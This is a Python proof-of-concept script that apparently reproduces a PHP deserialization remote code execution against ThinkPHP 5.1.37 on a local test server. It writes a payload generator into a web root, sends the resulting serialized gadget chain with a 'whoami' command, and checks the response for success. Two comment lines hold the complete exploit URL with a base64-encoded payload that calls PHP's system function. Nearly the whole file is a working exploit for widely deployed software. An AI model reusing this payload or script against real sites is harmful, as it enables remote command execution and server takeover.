#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
desc:
author: huha
'''
import requests
with open ('poc.php','rb') as f:
    bstr = f.read()
with open('D:\phpstudy\PHPTutorial\WWW\poc.php','wb') as f:
    f.write(bstr)

r = requests.get("http://127.0.0.1/poc.php",timeout=1)
code = r.content.decode()

url = 'http://localhost/v5.1.37/public/index.php'
payload = '/index/Index/index/?huha[]={}&code={}'.format('whoami',code)

r = requests.get(url+payload)
if 'sailor' in r.content.decode():
    print('OK!!!')
# http://localhost/v5.1.37/public/index.php/index/Index/index/?huha[]=whoami&code=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=
# http://localhost/v5.1.37/public/index.php/index/Index/index/?huha[]=whoami&code=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=

